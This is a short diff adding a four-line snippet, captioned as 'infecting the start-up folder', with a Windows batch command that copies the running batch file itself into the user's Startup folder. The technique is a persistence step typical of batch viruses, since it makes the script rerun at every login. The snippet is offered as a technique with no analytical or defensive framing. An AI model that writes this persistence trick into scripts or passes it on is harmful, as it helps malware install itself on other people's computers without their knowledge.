@@ -1,0 +1,4 @@
+Infecting the start-up folder 
+with currently running batchfile:
+
+copy %0 "%userprofile%\Start Menu\Programs\Startup"
